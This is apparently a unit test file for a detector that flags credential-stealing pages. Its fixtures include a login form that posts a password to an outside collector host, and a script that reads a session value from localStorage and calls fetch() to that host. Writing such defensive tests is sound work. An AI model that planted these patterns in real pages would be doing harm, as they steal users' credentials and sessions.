
import unittest

from modules.information_stealer_detector import analyze_stealer_risk


class TestInformationStealerDetector(unittest.TestCase):

    def test_invalid_input(self):
        result = analyze_stealer_risk("hello")
        self.assertEqual(result["status"], "Invalid Input")

    def test_empty_input(self):
        result = analyze_stealer_risk("")
        self.assertEqual(result["status"], "Invalid Input")

    def test_normal_https_url(self):
        result = analyze_stealer_risk("https://example.com/")
        self.assertEqual(result["risk_score"], 0)
        self.assertEqual(result["status"], "No URL/Page Red Flags Found")

    def test_http_adds_indicator(self):
        result = analyze_stealer_risk("http://example.com/")
        self.assertIn("Unencrypted HTTP", result["indicators"])
        self.assertGreater(result["risk_score"], 0)

    def test_password_form_is_detected(self):
        html = """
        <form action="/login">
            <input type="password" name="password">
        </form>
        """
        result = analyze_stealer_risk("https://example.com/", html)
        self.assertIn("Password input field", result["indicators"])

    def test_external_form_is_detected(self):
        html = """
        <form action="https://collector.invalid/submit">
            <input type="password" name="password">
        </form>
        """
        result = analyze_stealer_risk("https://example.com/", html)
        self.assertIn(
            "Form submits to another host",
            result["indicators"]
        )

    def test_data_access_and_network_indicators(self):
        html = """
        <script>
            let x = localStorage.getItem("session");
            fetch("https://collector.invalid/submit");
        </script>
        """
        result = analyze_stealer_risk("https://example.com/", html)
        self.assertIn("localStorage access", result["indicators"])
        self.assertIn("Fetch API usage", result["indicators"])

    def test_result_has_common_schema(self):
        result = analyze_stealer_risk("https://example.com/")
        required_keys = {
            "module", "threat", "risk_score", "status",
            "indicators", "explanation", "recommendations", "url"
        }
        self.assertTrue(required_keys.issubset(result.keys()))


if __name__ == "__main__":
    unittest.main()
